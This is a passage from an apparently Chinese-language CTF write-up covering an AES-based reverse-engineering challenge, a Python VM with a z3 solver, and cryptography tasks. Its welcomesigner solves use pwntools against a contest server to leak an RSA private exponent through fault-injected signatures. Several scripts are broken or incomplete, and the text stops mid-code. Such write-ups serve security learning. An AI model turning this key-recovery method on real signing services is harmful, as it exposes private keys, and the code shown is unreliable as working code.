+    return ((((y >> 0) & 1) * aes_xtimes(x, 0)) ^
+        (((y >> 1) & 1) * aes_xtimes(x, 1)) ^
+        (((y >> 2) & 1) * aes_xtimes(x, 2)) ^
+        (((y >> 3) & 1) * aes_xtimes(x, 3)) ^
+        (((y >> 4) & 1) * aes_xtimes(x, 4)) ^
+        (((y >> 5) & 1) * aes_xtimes(x, 5)) ^
+        (((y >> 6) & 1) * aes_xtimes(x, 6)) ^
+        (((y >> 7) & 1) * aes_xtimes(x, 7)));
+}
+/****************************************************************************************************************/
+void aes_mix_columns(AES_CYPHER_T mode, uint8_t *state)
+{
+    uint8_t y[16] = { 2, 3, 1, 1,  1, 2, 3, 1,  1, 1, 2, 3,  3, 1, 1, 2 };
+    uint8_t s[4];
+    int i, j, r;
+
+    for (i = 0; i < g_aes_nb[mode]; i++) {
+        for (r = 0; r < 4; r++) {
+            s[r] = 0;
+            for (j = 0; j < 4; j++) {
+                s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]);
+            }
+        }
+        for (r = 0; r < 4; r++) {
+            state[i * 4 + r] = s[r];
+        }
+    }
+}
+/****************************************************************************************************************/
+int aes_encrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
+{
+    uint8_t w[4 * 4 * 15] = { 0 }; /* round key */
+    uint8_t s[4 * 4] = { 0 }; /* state */
+
+    int nr, i, j;
+
+    /* key expansion */
+    aes_key_expansion(mode, key, w);
+
+    /* start data cypher loop over input buffer */
+    for (i = 0; i < len; i += 4 * g_aes_nb[mode]) {
+
+        /* init state from user buffer (plaintext) */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            s[j] = data[i + j];
+
+        /* start AES cypher loop over all AES rounds */
+        for (nr = 0; nr <= g_aes_rounds[mode]; nr++) {
+
+            if (nr > 0) {
+
+                /* do SubBytes */
+                aes_sub_bytes(mode, s);
+
+                /* do ShiftRows */
+                aes_shift_rows(mode, s);
+
+                if (nr < g_aes_rounds[mode]) {
+                    /* do MixColumns */
+                    aes_mix_columns(mode, s);
+                }
+            }
+
+            /* do AddRoundKey */
+            aes_add_round_key(mode, s, w, nr);
+        }
+
+        /* save state (cypher) to user buffer */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            data[i + j] = s[j];
+    }
+
+    return 0;
+}
+/****************************************************************************************************************/
+int aes_encrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
+{
+    return aes_encrypt(mode, data, len, key);
+}
+/****************************************************************************************************************/
+int aes_encrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)
+{
+    uint8_t w[4 * 4 * 15] = { 0 }; /* round key */
+    uint8_t s[4 * 4] = { 0 }; /* state */
+    uint8_t v[4 * 4] = { 0 }; /* iv */
+
+    int nr, i, j;
+
+    /* key expansion */
+    aes_key_expansion(mode, key, w);
+
+    memcpy(v, iv, sizeof(v));
+
+    /* start data cypher loop over input buffer */
+    for (i = 0; i < len; i += 4 * g_aes_nb[mode]) {
+
+        /* init state from user buffer (plaintext) */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            s[j] = data[i + j] ^ v[j];
+
+        /* start AES cypher loop over all AES rounds */
+        for (nr = 0; nr <= g_aes_rounds[mode]; nr++) {
+
+            if (nr > 0) {
+
+                /* do SubBytes */
+                aes_sub_bytes(mode, s);
+
+                /* do ShiftRows */
+                aes_shift_rows(mode, s);
+
+                if (nr < g_aes_rounds[mode]) {
+                    /* do MixColumns */
+                    aes_mix_columns(mode, s);
+                }
+            }
+
+            /* do AddRoundKey */
+            aes_add_round_key(mode, s, w, nr);
+        }
+
+        /* save state (cypher) to user buffer */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            data[i + j] = v[j] = s[j];
+    }
+
+    return 0;
+}
+/****************************************************************************************************************/
+void inv_shift_rows(AES_CYPHER_T mode, uint8_t *state)
+{
+    uint8_t *s = (uint8_t *)state;
+    int i, j, r;
+
+    for (i = 1; i < g_aes_nb[mode]; i++) {
+        for (j = 0; j < g_aes_nb[mode] - i; j++) {
+            uint8_t tmp = s[i];
+            for (r = 0; r < g_aes_nb[mode]; r++) {
+                s[i + r * 4] = s[i + (r + 1) * 4];
+            }
+            s[i + (g_aes_nb[mode] - 1) * 4] = tmp;
+        }
+    }
+}
+/****************************************************************************************************************/
+uint8_t inv_sub_sbox(uint8_t val)
+{
+    return g_inv_sbox[val];
+}
+/****************************************************************************************************************/
+void inv_sub_bytes(AES_CYPHER_T mode, uint8_t *state)
+{
+    int i, j;
+
+    for (i = 0; i < g_aes_nb[mode]; i++) {
+        for (j = 0; j < 4; j++) {
+            state[i * 4 + j] = inv_sub_sbox(state[i * 4 + j]);
+        }
+    }
+}
+/****************************************************************************************************************/
+void inv_mix_columns(AES_CYPHER_T mode, uint8_t *state)
+{
+    uint8_t y[16] = { 0x0e, 0x0b, 0x0d, 0x09,  0x09, 0x0e, 0x0b, 0x0d,
+        0x0d, 0x09, 0x0e, 0x0b,  0x0b, 0x0d, 0x09, 0x0e };
+    uint8_t s[4];
+    int i, j, r;
+
+    for (i = 0; i < g_aes_nb[mode]; i++) {
+        for (r = 0; r < 4; r++) {
+            s[r] = 0;
+            for (j = 0; j < 4; j++) {
+                s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]);
+            }
+        }
+        for (r = 0; r < 4; r++) {
+            state[i * 4 + r] = s[r];
+        }
+    }
+}
+/****************************************************************************************************************/
+int aes_decrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
+{
+    uint8_t w[4 * 4 * 15] = { 0 }; /* round key */
+    uint8_t s[4 * 4] = { 0 }; /* state */
+
+    int nr, i, j;
+
+    /* key expansion */
+    aes_key_expansion(mode, key, w);
+
+    /* start data cypher loop over input buffer */
+    for (i = 0; i < len; i += 4 * g_aes_nb[mode]) {
+
+        /* init state from user buffer (cyphertext) */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            s[j] = data[i + j];
+
+        /* start AES cypher loop over all AES rounds */
+        for (nr = g_aes_rounds[mode]; nr >= 0; nr--) {
+
+            /* do AddRoundKey */
+            aes_add_round_key(mode, s, w, nr);
+
+            if (nr > 0) {
+
+                if (nr < g_aes_rounds[mode]) {
+                    /* do MixColumns */
+                    inv_mix_columns(mode, s);
+                }
+
+                /* do ShiftRows */
+                inv_shift_rows(mode, s);
+
+                /* do SubBytes */
+                inv_sub_bytes(mode, s);
+            }
+        }
+
+        /* save state (cypher) to user buffer */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            data[i + j] = s[j];
+    }
+
+    return 0;
+}
+/****************************************************************************************************************/
+int aes_decrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
+{
+    return aes_decrypt(mode, data, len, key);
+}
+/****************************************************************************************************************/
+int aes_decrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)
+{
+    uint8_t w[4 * 4 * 15] = { 0 }; /* round key */
+    uint8_t s[4 * 4] = { 0 }; /* state */
+    uint8_t v[4 * 4] = { 0 }; /* iv */
+
+    int nr, i, j;
+
+    /* key expansion */
+    aes_key_expansion(mode, key, w);
+
+    memcpy(v, iv, sizeof(v));
+
+    /* start data cypher loop over input buffer */
+    for (i = 0; i < len; i += 4 * g_aes_nb[mode]) {
+
+        /* init state from user buffer (cyphertext) */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
+            s[j] = data[i + j];
+
+        /* start AES cypher loop over all AES rounds */
+        for (nr = g_aes_rounds[mode]; nr >= 0; nr--) {
+
+            /* do AddRoundKey */
+            aes_add_round_key(mode, s, w, nr);
+
+            if (nr > 0) {
+
+                if (nr < g_aes_rounds[mode]) {
+                    /* do MixColumns */
+                    inv_mix_columns(mode, s);
+                }
+
+                /* do ShiftRows */
+                inv_shift_rows(mode, s);
+
+                /* do SubBytes */
+                inv_sub_bytes(mode, s);
+            }
+        }
+
+        /* save state (cypher) to user buffer */
+        for (j = 0; j < 4 * g_aes_nb[mode]; j++) {
+            uint8_t p = s[j] ^ v[j];
+            v[j] = data[i + j];
+            data[i + j] = p;
+        }
+    }
+
+    return 0;
+}
+/****************************************************************************************************************/
+void aes_cypher_128_test()
+{
+#if 1
+    uint8_t buf[] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff };
+    uint8_t key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
+#else
+    uint8_t buf[] = { 0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d,
+        0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34 };
+    uint8_t key[] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
+        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
+#endif
+
+    aes_encrypt(AES_CYPHER_128, buf, sizeof(buf), key);
+
+    aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key);
+}
+/****************************************************************************************************************/
+void aes_cypher_192_test()
+{
+    uint8_t buf[] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff };
+    uint8_t key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17 };
+
+    aes_encrypt(AES_CYPHER_192, buf, sizeof(buf), key);
+
+    aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key);
+}
+/****************************************************************************************************************/
+void aes_cypher_256_test()
+{
+    uint8_t buf[] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff };
+    uint8_t key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
+        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f };
+
+    aes_encrypt(AES_CYPHER_256, buf, sizeof(buf), key);
+
+    aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key);
+}
+/****************************************************************************************************************/
+void main()
+{
+    //数据
+    uint8_t buf[] = { 0x2b,0xc8,0x20,0x8b,0x5c,0x0d,0xa7,0x9b,0x2a,0x51,0x3a,0xd2,0x71,0x71,0xca,0x50 };
+    //密钥
+    uint8_t key[] = { 0x52,0x65,0x5f,0x31,0x73,0x5f,0x65,0x61,0x53,0x79,0x31,0x32,0x33,0x34,0x35,0x36 };
+    //uint8_t key[] = { 0x52,0x65,0x5f,0x31,0x73,0x5f,0x65,0x61,0x53,0x79,0x31,0x32,0x33,0x34,0x35,0x36 };
+    //向量
+    uint8_t iv[] = {0x31, 0x5F, 0x65, 0x52, 0x61, 0x65, 0x5F, 0x73, 0x32, 0x31, 0x79, 0x53, 0x36, 0x35, 0x34, 0x33};
+    switch (sizeof(key))
+    {
+    //ECB
+    
+    case 16:aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key); break;
+    case 24:aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key); break;
+    case 32:aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key); break;
+    //CBC
+    /*
+    case 16:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); break;
+    case 24:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); break;
+    case 32:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); break;
+    */
+    }
+    for (int i = 0; i < sizeof(buf); i++)
+    {
+        printf("%x", buf[i] & 0xFF);
+    }
+    printf("\n");
+    return;
+}
+```
+
+拼一块就是flag
+
+## RightBack
+
+很恶心的字节码很长，大致逻辑是这样的
+
+```Python
+import struct
+
+T = lambda: 1
+p1 = lambda: 2
+p2 = lambda: 3
+p3 = lambda: 4
+F1 = lambda: 5
+F2 = lambda: 6
+F3 = lambda: 7
+F4 = lambda: 8
+F5 = lambda: 9
+F6 = lambda: 10
+F7 = lambda: 11
+F8 = lambda: 12
+F9 = lambda: 13
+FA = lambda: 14
+FB = lambda: 15
+WC = lambda: 16
+VM = lambda: 17
+Have = lambda: 18
+Fun = lambda: 19
+
+if __name__ == '__main__':
+    REG = {}
+    EIP = 0
+    reg_table = {'EAX': ('1', '2', '3', '4', '5', '6', '7')}
+    Sbox = [
+    (82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125)
+]
+
+    Rcon = [
+        16777216, 33554432, 67108864, 134217728, 268435456, 536870912, 1073741824, 0x80000000L, 452984832, 905969664
+    ]
+
+    s = []
+
+    key = 'CalmDownBelieveU'
+    s = p1(s, key)#key初始化
+    key = [61, 15, 58, 65, 177, 180, 182, 248, 192, 143, 37, 238, 50, 29, 215, 190]
+    s.extend(key)
+    key = bytes(p3(s, key))
+    key = p2(bytes(key))
+    extendKey = key
+    opcode = []
+    s.extend([69, 136, 121, 24, 179, 67, 209, 20, 27, 169, 205, 146, 212, 160, 124, 49, 20, 155, 157, 253, 52, 71, 174, 164, 134, 60, 184, 203, 131, 210, 57, 151, 77, 241, 61, 6, 13, 52, 235, 37, 100, 178, 8, 238, 205, 27, 194, 159, 230, 165, 211, 221, 100, 217, 111, 202, 185, 207, 226, 50, 88, 4, 58, 73, 10, 92, 24, 230, 246, 245, 21, 110, 182, 151, 85, 28, 181, 191, 185, 236, 92, 98, 222, 85, 228, 14, 235, 93, 77, 161, 61, 140, 222, 74, 124, 13, 211, 75, 134, 235, 164, 228, 235, 16, 29, 41, 49, 105, 188, 51, 232, 65, 209, 165, 35, 182, 248, 245, 69, 18, 152, 71, 223, 85, 114])
+    p3_result = p3(s, FB())
+    right = Have()
+    back = Fun(right)
+    data1 = [228, 244, 207, 251, 194, 124, 252, 61, 198, 145, 97, 98, 89, 25, 92, 208, 155, 38, 34, 225, 98, 206, 234, 245, 223, 54, 214, 137, 35, 86, 180, 66, 223, 234, 90, 136, 5, 189, 166, 117, 111, 222, 39, 156, 163, 173, 36, 174, 47, 144, 15, 160, 45, 239, 211, 11, 190, 181, 24, 164, 234, 114, 174, 27]
+    data1 = bytes(p3(s, data1))
+    data2 = [165, 83, 203, 51, 99, 164, 30, 91, 230, 64, 181, 55, 190, 47, 125, 240, 186, 173, 116, 47, 89, 64, 68, 215, 124, 138, 34, 175, 60, 136, 77, 216, 250, 127, 14, 14, 66, 168, 198, 247, 252, 189, 243, 239, 25, 63, 143, 7, 177, 13, 99, 226, 100, 6, 207, 77, 46, 136, 251, 123, 225, 27, 76, 183]
+    data2 = bytes(p3(s, data2))
+    data3 = [95, 219, 46, 178, 111, 141, 17, 168, 254, 60, 68, 59, 41, 183, 182, 118, 3, 47, 150, 240, 140, 159, 110, 238]
+    data3 = bytes(p3(s, data3))
+    if data2 == back:
+        print(data1.decode())
+    else:
+        print(data3.decode())
+```
+
+p1是rc4对key的初始化，初始化出sbox，p2是一个异或，p3是rc4的加密，每次调用会改sbox，Have函数是一个打印字符串和获取输入，输入长度为64位，然后传到Fun里，Fun这个加密有点逆天
+
+```Python
+def Fun(right):
+    back = b''
+    
+    if len(right) != 64:
+        print(None + len('XD'))
+        print()
+    
+    for i in range(len(right) // 8):
+        part1 = struct.unpack('>I', right[i*8 : i*8+4])[0]
+        part2 = struct.unpack('>I', right[i*8+4 : i*8+8])[0]
+        
+        if part1 != 0:
+            part1 ^= struct.unpack('>I', back[i*8-8 : i*8-4])[0]
+            part2 ^= struct.unpack('>I', back[i*8-4 : i*8])[0]
+        
+        vm(part1，part2)
+        back += struct.pack('>I', struct.unpack('>I', struct.pack('>I', part1) + struct.pack('>I', part2))[0] + struct.unpack('>I', struct.pack('>I', part1) + struct.pack('>I', part2))[0])
+    
+    return back
+```
+
+最后发现，其实可以修的，只需要用pyspy nop一下invaild即可，虚拟机那一块没有多少花指令，所以修完只有VM函数有点问题：
+
+```Python
+def F1(part1, part2):
+    global REG
+    # REG = {'EAX':0, 'EBX':0, 'ECX':0, 'EDX':0, 'R8':0, 'CNT':0, 'EIP':0}
+    reg_table = {
+        '1': 'EAX',
+        '2': 'EBX',
+        '3': 'ECX',
+        '4': 'EDX',
+        '5': 'R8',
+        '6': 'CNT',
+        '7': 'EIP' }
+    REG['ECX'] = 0
+    REG['EDX'] = 0
+    REG['E8'] = 0
+    REG['CNT'] = 0
+    REG['EIP'] = 0
+    REG['EAX'] = part1
+    REG['EBX'] = part2
+opcode = [7, 153, 255]
+
+def F2(v1, v2, v3):
+    global REG, reg_table
+    if v1 == 1:
+        REG[reg_table[str(v2)]] = extendKey[REG[reg_table[str(v3)]]]
+    elif v1 == 2 :
+        REG[reg_table[str(v2)]] = REG[reg_table[str(v3)]]
+    elif v1 == 3:
+        REG[reg_table[str(v2)]] = v3
+    REG['EIP'] += 4
+    
+def F3(v1, v2, v3):
+    if v1 == 1:
+        REG[reg_table[str(v2)]] = (REG[reg_table[str(v2)]] + extendKey[REG[reg_table[str(v3)]]]) & 0xffffffff
+    elif v1 == 2:
+        REG[reg_table[str(v2)]] = (REG[reg_table[str(v2)]] + REG[reg_table[str(v3)]]) & 0xffffffff
+    elif v1 == 3:
+        REG[reg_table[str(v2)]] = (REG[reg_table[str(v2)]] + v3)
+    REG['EIP'] += 4
+
+def F4(v1, v2):
+    REG[reg_table[str(v1)]] ^= REG[reg_table[str(v2)]]
+    REG['EIP'] += 3
+
+def F5(v1, v2):
+    REG[reg_table[str(v1)]] &= v2
+    REG['EIP'] += 3
+    
+def F6(v1, v2, v3):
+    if v1 == 1:
+        REG[reg_table[str(v2)]] -= extendKey[v3]
+    elif v1 == 2:
+        REG[reg_table[str(v2)]] -= REG[reg_table[str(v3)]]
+    elif v1 == 3:
+        REG[reg_table[str(v2)]] -= v3
+    REG['EIP'] += 4
+
+def F7(v1, v2):
+    REG[reg_table[str(v1)]] |= REG[reg_table[str(v2)]]
+    REG['EIP'] += 3
+    
+def F8(v1, v2):
+    REG[reg_table[str(v1)]] = (REG[reg_table[str(v1)]] >> REG[reg_table[str(v2)]])&0xffffffff
+    REG['EIP'] += 3
+    
+def F9(v1, v2):
+    REG[reg_table[str(v1)]] = (REG[reg_table[str(v1)]] << REG[reg_table[str(v2)]])&0xffffffff
+    REG['EIP'] += 3
+    
+def FA(v1, v2, v3):
+    if v1 == 1:
+        REG[reg_table[str(v2)]] *= extendKey[v3]
+    elif v1 == 2:
+        REG[reg_table[str(v2)]] *= REG[reg_table[str(v3)]]
+    elif v1 == 3:
+        REG[reg_table[str(v2)]] *= v3
+    REG['EIP'] += 4
+    
+def FB():
+    REG['R8'] = (REG['CNT'] == 21)
+    REG['EIP'] += 1
+
+def WC():
+    if REG['R8']:
+        REG['EIP'] += 1
+    else:
+        REG['EIP'] = 16
+
+def VM(part1, part2):
+    F1(part1, part2)
+    EIP = REG['EIP']
+    if opcode[EIP] == 80:
+        F2(opcode[EIP+1], opcode[EIP+2], opcode[EIP+3])
+    elif opcode == 29:
+        F3(opcode[EIP+1], opcode[EIP+2], opcode[EIP+3])
+    elif opcode == 113:
+        F4(opcode[EIP+1], opcode[EIP+2])
+    elif opcode == 114:
+        F5(opcode[EIP+1], opcode[EIP+2])
+    elif opcode == 150:
+        F6(opcode[EIP+1], opcode[EIP+2], opcode[EIP+3])
+    elif opcode == 87:
+        F7(opcode[EIP+1], opcode[EIP+2])
+    elif opcode == 116:
+        F8(opcode[EIP+1], opcode[EIP+2])
+    elif opcode == 41:
+        F9(opcode[EIP+1], opcode[EIP+2])
+    elif opcode == 220:
+        FA(opcode[EIP+1], opcode[EIP+2], opcode[EIP+3])
+    elif opcode == 7:
+        FB()
+    elif opcode == 153:
+        WC()
+```
+
+加密流程：vm和异或
+
+```Python
+data = [0x43af236,
+0x56b19afc,
+0xf71e21dc,
+0xdb8f8e94,
+0x4d34e79d,
+0x9c520c6e,
+0xfbfad5fd,
+0x32f9782c,
+0xbbbe39c1,
+0xd98575b6,
+0x28f8cc78,
+0xa4e48592,
+0xebd72c5,
+0xaf87912a,
+0x8bf1ef96,
+0x1660d112]
+from z3 import*
+s=Solver()
+flag = [BitVec("flag%d" % i,64) for i in range(2)]
+#flag[0] ^= data[12]
+#flag[1] ^= data[13]
+extendKey = [1835819331, 1853321028, 1768711490, 1432712805, 2177920767, 4020699579, 2261476601, 3551400604, 711874531, 3318306392, 1124217505, 2427199549, 3099853672, 2098025776, 1041196945, 2929936300, 246748610, 1941455090, 1303848803, 3809763535, 1395557789, 546751855, 1830937100, 2385871555, 2516030638, 3043054017, 3628118989, 1450520846, 1825094265, 3651791800, 32069749, 1469868411, 919887482, 4017993154, 4002737591, 3104343244, 4134211933, 420914335, 4152510760, 1317719524, 1990496755, 1873950060, 2553314372, 3602559392]
+ecx = 0
+flag[0] = (flag[0] + extendKey[ecx]) & 0xffffffff
+ecx = 1
+flag[1] = (flag[1] + extendKey[ecx]) & 0xffffffff
+cnt = 0
+r8 = 0
+edx = 0
+#cmp = [0x43af236, 0x56b19afc,0xf71e21dc, 0xdb8f8e94,0x4d34e79d, 0x9c520c6e,0xfbfad5fd, 0x32f9782c,0xbbbe39c1, 0xd98575b6,0x28f8cc78, 0xa4e48592,0xebd72c5, 0xaf87912a,0x8bf1ef96, 0x1660d112]
+
+while(cnt < 21):
+    cnt += 1
+    flag[0] ^= flag[1]
+    ecx = flag[0]
+    r8 = flag[1]
+    flag[1] &= 31
+    flag[0] = (flag[0] << flag[1])&0xffffffff
+    edx = 32
+    edx -= flag[1]
+    ecx = (ecx >> edx)&0xffffffff
+    flag[0] |= ecx&0xffffffff
+    flag[1] = cnt
+    flag[1] *= 2
+    ecx = extendKey[flag[1]]
+    flag[0] = (flag[0] + ecx) & 0xffffffff
+    flag[1] = r8
+    flag[1] ^= flag[0]
+    ecx = flag[1]
+    edx = flag[0]
+    edx &= 31
+    flag[1] = (flag[1] << edx)&0xffffffff
+    r8 = 32
+    r8 -= edx
+    ecx = (ecx >> r8)&0xffffffff
+    flag[1] |= ecx&0xffffffff
+    ecx = cnt
+    ecx *= 2
+    ecx = (ecx + 1)
+    edx = extendKey[ecx]
+    flag[1] = (flag[1] + edx) & 0xffffffff
+s.add(flag[1] & 0xffffffff == 0x56b19afc)#第一组的第一个
+s.add(flag[0] & 0xffffffff == 0x43af236)#第一组的第二个
+if s.check() == sat:
+    m = s.model()
+    print(m)
+#print(v5)
+from Crypto.Util.number import long_to_bytes
+#[flag0 = 1464681300, flag1 = 1182484272]
+#[flag0 = 811877750, flag1 = 862873966]
+#[flag0 = 1730238768, flag1 = 1967223397]
+#[flag0 = 1098343795, flag1 = 812462881]
+#[flag0 = 559049063, flag1 = 1752449633]
+#[flag0 = 1667974770, flag1 = 1869431345]
+#[flag0 = 1633905485, flag1 = 829583920]
+#[flag0 = 1914787663, flag1 = 1461789053]
+flag_f = [1464681300,1182484272,811877750,862873966,1730238768,1967223397,1098343795,812462881,559049063,1752449633,1667974770,1869431345,1633905485,829583920,1914787663,1461789053]
+for i in range(len(flag_f)):
+    print(long_to_bytes(flag_f[i]).decode(),end="")
+```
+
+# Cry
+
+## signin
+
+先是一个跟DASCTF七月赛的一个p^q泄露，剪枝爆破一下就行。
+
+后面是一个简单的hnp问题。
+
+r=(b*s)%2^16
+
+$$b_i*s-r_i=k_i*2^{16}\mod p\\ b_i*s*2^{-16}-r_i*2^{-16}=k_i\mod p$$
+
+k是一个496bits，满足hnp
+
+## welcomesigner2
+
+myfastexp的函数效果如下
+
+$$先逆向处理d,根据参数j左右分成dl,dr.\\ f(j)=(m^{re(dl)} mod n)*(B_{l-j-1}^{re(dr)}\mod n\_)\mod n\_$$
+
+其中B数组可以直接算出
+
+从左往右，如果对应位数为0，那么上面式子的左半部分大小不变，以此来构建等式，逐位得到dr
+
+Exp
+
+```Python
+# -*- coding utf-8 -*-
+# @Time : 2023/8/19 18:04
+from Crypto.Util.number import *
+from Crypto.Cipher import AES
+from hashlib import md5
+from pwn import *
+# context.log_level='debug'
+
+msg = bytes_to_long(b"Welcome_come_to_WMCTF")
+while 1:
+    io=remote('1.13.101.243',28412)
+    io.recvuntil(b'|\t[Q]uit\n')
+    io.sendline(b'g')
+    io.recvuntil(b'| n = ')
+    n=int(io.recvuntil(b'\n',drop=True))
+    D='1'
+    l=1023
+    io.recvuntil(b'flag_ciphertext = ')
+    flag=io.recvuntil(b'\n',drop=True)
+    print(flag)
+    io.sendline(b'f')
+    io.recvuntil(b'bytes, and index:')
+    io.sendline(b'2,2')
+    io.recvuntil(b'| [+] update: n_ -> "')
+    n_=int(io.recvuntil(b'"\n',drop=True))
+
+for i in range(1,1023):
+    io.recvuntil(b'|\t[Q]uit\n')
+    io.sendline(b's')
+    io.recvuntil(b'Where your want to interfere:')
+    io.sendline(str(i).encode())
+    io.recvuntil(b' is ')
+    sig1=int(io.recvuntil(b'\n',drop=True))
+    t1=sig1*inverse(pow(B[l-i-1],2*int(D,2),n_),n_) %n_
+    io.recvuntil(b'|\t[Q]uit\n')
+    io.sendline(b's')
+    io.recvuntil(b'Where your want to interfere:')
+    io.sendline(str(i+1).encode())
+    io.recvuntil(b' is ')
+    sig2=int(io.recvuntil(b'\n',drop=True))
+    t2=sig2*inverse(pow(B[l-i-2],4*int(D,2),n_),n_) %n_
+    if t1==t2:
+        D+='0'
+    else:
+        D+='1'
+    if '111111111111111' in D:
+        break
+if len(D)>=1020:
+    print(D)
+    break
+```
+
+得到密文和d来解密
+
+```Python
+import hashlib
+
+from Crypto.Cipher import AES
+from Crypto.Util.number import *
+c=bytes.fromhex('2e8afbc4419284fb733a20c7e932feadae5deeb39f0e1d01c57c8109c08eb2020d48616c59d50d1a029a08b7673c9f71')
+c2=bytes.fromhex('329a89386fb65ccfd11a7c64349f1d45850a92e7f2e766da0fb07ddb64b0386ce11d7e7803fd4953023deeadf54ad7f7')
+key1=
+key2=
+key = bytes.fromhex(hashlib.md5(str(key1).encode()).hexdigest())
+enc = AES.new(key,mode=AES.MODE_ECB)
+flag = enc.decrypt(c)
+print(flag)
+key = bytes.fromhex(hashlib.md5(str(key2).encode()).hexdigest())
+enc = AES.new(key,mode=AES.MODE_ECB)
+flag = enc.decrypt(c2)
+print(flag)
+```
+
+## welcomesigner1
+
+myfastexp的函数效果如下
+```
+$$先对d的二进制逆向，根据参数j左右分成dl,dr.\\ f(j)=((m^{dl} mod n) <
+```
+从左往右，如果对应位数为0，那么上面式子的右半部分大小不变，以此来构建等式，得到dl
+
+exp参考上题，关键不同代码
+
+```Python
+for i in range(l-1,0,-1):
+    temp=pow(msg,int(D,2),n)
+    temp1=pow(temp,2**i,n_)
+    temp=pow(msg,2*int(D,2),n)
+    temp2=pow(temp,2**(i-1),n_)
+    io.recvuntil(b'|\t[Q]uit\n')
+    io.sendline(b's')
+    io.recvuntil(b'Where your want to interfere:')
+    io.sendline(str(i).encode())
+    io.recvuntil(b' is ')
+    sig1=int(io.recvuntil(b'\n',drop=True))
+    t1=sig1*inverse(temp1,n_) %n_
+    # print(sig1)
+    io.recvuntil(b'|\t[Q]uit\n')
+    io.sendline(b's')
+    io.recvuntil(b'Where your want to interfere:')
+    io.sendline(str(i-1).encode())
+    io.recvuntil(b' is ')
+    sig2=int(io.recvuntil(b'\n',drop=True))
+    t2=sig2*inverse(temp2,n_) %n_
+    if t1==t2:
+        D+='0'
+    else:
+        D+='1'
+    if '11111111111' in D:
+        break
+print(D)
+if len(D)>=1020:
+    print(D)
+    break
+```
+
+## badprime
+
+简单的签到
+
+```Python
+from Crypto.Util.number import *
